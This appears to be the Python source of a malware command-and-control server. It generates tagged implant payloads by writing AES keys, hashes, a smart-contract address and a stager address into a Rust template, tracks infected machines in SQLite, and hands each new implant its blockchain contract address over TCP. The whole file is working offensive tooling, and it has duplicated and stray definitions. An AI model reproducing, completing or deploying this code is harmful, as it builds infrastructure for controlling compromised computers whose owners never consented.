import socket, threading, readline, secrets, hashlib, sqlite3, base64
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import unpad
from Crypto import Random

# Global variable that mantain client's connections
connections = []

debug = True
contractAddress = None

def write_hash_to_artifact(hash, uniqueAESKey, smartContractKey, KeccakData, stagerAddress):
    KeccakData = "0x" + KeccakData
    # ContractVariable = ContractVariable[0].upper()+ContractVariable[1:]
    fin = open("./templates/template.rs", "rt")
    if debug != True:
        fout = open(f"main-{datetime.utcnow().timestamp()}.rs", "wt")
    else:
        fout = open(f"./migrate/src/main.rs", "wt")
    #for each line in the input file
    for line in fin:
        #read replace the string and write to output file CONTRACTVARIABLENAME
        fout.write(line.replace('UNIQUEHASH', hash).replace('UNIQUEAESKEY', uniqueAESKey.decode('utf-8')).replace('SMARTCONTRACTKEY', smartContractKey).replace('KECCAKHERE', KeccakData).replace('STAGERADDRESS', stagerAddress))
    smartContractKey = None
    #close input and output files
    fin.close()
    fout.close()

def _pad(s):
    bs = AES.block_size
    return s + (bs - len(s) % bs) * chr(bs - len(s) % bs)

@staticmethod
def _unpad(s):
    return s[:-ord(s[len(s)-1:])]

def AESencrypt(key, raw):
        raw = _pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

def AESdecrypt(key, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
        return _unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')


def gen_payload(server, contractAddress_recv, contractKey, KeccakData):
    global contractAddress
    contractAddress = contractAddress_recv
    print(f"Smart contract address :: {contractAddress}")
    print(f"Smart contract Keccak :: {KeccakData}")

    conn = sqlite3.connect('machines.db')
    # Generate sha256 hash from random bits (unsafe)
    randbits = secrets.randbits(1024)
    m = hashlib.sha256()
    m.update(str(randbits).encode("utf-8"))
    createdHash = m.hexdigest().encode("utf-8")
    print(f"Generated payload with hash :: {createdHash}")

    key = get_random_bytes(16)
    ciphertext = AESencrypt(key, server)


    plaintext = AESdecrypt(key, ciphertext)

    # Save hash into DB
    cursor = conn.cursor()
    cursor.execute("""
                    CREATE TABLE IF NOT EXISTS machines (
                        first_run integer NOT NULL,
                        machine_id text NOT NULL,
                        aesCipherText text NOT NULL
                    );""")
    sql = '''INSERT INTO machines(first_run, machine_id, aesCipherText)
              VALUES(?,?,?)'''
    cursor.execute(sql, (1, createdHash, ciphertext))
    conn.commit()
    conn.close()

    # Write hash into artifact

    write_hash_to_artifact(m.hexdigest(), base64.b64encode(key), contractKey, KeccakData, server)


def list_payloads():
    conn = sqlite3.connect('machines.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM machines")
    records = cursor.fetchall()
    for x in records:
        print(f"MACHINE ID :: {x[0]} - {x[1]}")
    conn.close()

def check_if_hash_exists(message, connection):
    global contractAddress
    message = message.strip()
    conn = sqlite3.connect('machines.db')
    cursor = conn.cursor()
    cursor.execute("SELECT machine_id, first_run FROM machines WHERE machine_id = ?", (message,))
    records = cursor.fetchone()
    if(records):
        if(records[1] == 1):
            cursor.execute("SELECT aesCipherText FROM machines WHERE machine_id = ?", (message,))
            records = cursor.fetchall()
            print(f"Records: {records[0][0]}\n")
            print(f"New client incomming! preparing the missiles to attack :: {connection.getpeername()}\nSending smart contract address :: {contractAddress}")
            cursor.execute("UPDATE machines SET first_run = 0")
            connection.send(contractAddress.encode('utf-8'))
            conn.commit()
        else:
            connection.send(message)
    else:
        connection.send(message)
    contractAddress = None

    # Fetch one result from the query because it
    # doesn't matter how many records are returned.
    # If it returns just one result, then you know
    # that a record already exists in the table.
    # If no results are pulled from the query, then
    # fetchone will return None.
    conn.close()

def handle_user_connection(connection: socket.socket, address: str) -> None:
    '''
        Get user connection in order to keep receiving their messages and
        sent to others users/connections.
    '''
    while True:
        try:
            # Get client message
            msg = connection.recv(1024)

            # If no message is received, there is a chance that connection has ended
            # so in this case, we need to close connection and remove it from connections list.
            if msg:
                # Log message sent by user
                print(f'{address[0]}:{address[1]} - {msg.decode()}')
                # Build message format and broadcast to users connected on server
                msg_to_send = f'From {address[0]}:{address[1]} - {msg.decode()}'
                check_if_hash_exists(msg, connection)

            # Close connection if no message was sent
            else:
                remove_connection(connection)
                break

        except Exception as e:
            print(f'Error to handle user connection: {e}')
            remove_connection(connection)
            break


def broadcast(message: str, connection: socket.socket) -> None:
    '''
        Broadcast message to all users connected to the server
    '''

    # Iterate on connections in order to send message to all client's connected
    for client_conn in connections:
        # Check if isn't the connection of who's send
        if client_conn != connection:
            try:
                # Sending message to client connection
                client_conn.send(message.encode())

            # if it fails, there is a chance of socket has died
            except Exception as e:
                print('Error broadcasting message: {e}')
                remove_connection(client_conn)


def remove_connection(conn: socket.socket) -> None:
    '''
        Remove specified connection from connections list
    '''

    # Check if connection exists on connections list
    if conn in connections:
        # Close socket connection and remove connection from connections list
        conn.close()
        connections.remove(conn)


def server() -> None:
    '''
        Main process that receive client's connections and start a new thread
        to handle their messages
    '''

    LISTENING_PORT = 1338
    
    try:
        # Create server and specifying that it can only handle 4 connections by time!
        socket_instance = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_instance.setsockopt( socket.SOL_SOCKET, socket.SO_REUSEADDR, 1 ) 
        socket_instance.bind(('', LISTENING_PORT))
        socket_instance.listen(4)

        print('C2 Server running!\n')
        
        while True:

            # Accept client connection
            socket_connection, address = socket_instance.accept()
            # Add client connection to connections list
            connections.append(socket_connection)
            # Start a new thread to handle client connection and receive it's messages
            # in order to send to others connections
            threading.Thread(target=handle_user_connection, args=[socket_connection, address]).start()

    except KeyboardInterrupt:
        socket_instance.close()
    finally:
        # In case of any problem we clean all connections and close the server connection
        if len(connections) > 0:
            for conn in connections:
                remove_connection(conn)

        socket_instance.close()

def server() -> None:
    '''
        Main process that receive client's connections and start a new thread
        to handle their messages
    '''

    LISTENING_PORT = 1337
    
    try:
        # Create server and specifying that it can only handle 4 connections by time!
        socket_instance = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket_instance.setsockopt( socket.SOL_SOCKET, socket.SO_REUSEADDR, 1 ) 
        socket_instance.bind(('', LISTENING_PORT))
        socket_instance.listen(4)

        print('Server running!')
        
        while True:

            # Accept client connection
            socket_connection, address = socket_instance.accept()
            # Add client connection to connections list
            connections.append(socket_connection)
            # Start a new thread to handle client connection and receive it's messages
            # in order to send to others connections
            threading.Thread(target=handle_user_connection, args=[socket_connection, address]).start()

    except KeyboardInterrupt:
        socket_instance.close()
    finally:
        # In case of any problem we clean all connections and close the server connection
        if len(connections) > 0:
            for conn in connections:
                remove_connection(conn)

        socket_instance.close()

def command():
    while True:
        try:
            command = input("\n> ").split()
            if(command[0] == "gen_payload"):
                # 0x7f000001:0x53A 0xcbebf47dfEe4d9E69075A54e35a796f376e39dC8 fmPTbnQKLeEaHDqelq3kcw== c217acd5
                gen_payload(command[1], command[2], command[3], command[4])
            if(command[0]  == "list_payloads"):
                list_payloads()
        except Exception as err:
            print(f"{err}")

if __name__ == "__main__":
    serverThread = threading.Thread(target=server)
    commandThread = threading.Thread(target=command)
    serverThread.start()
    commandThread.start()
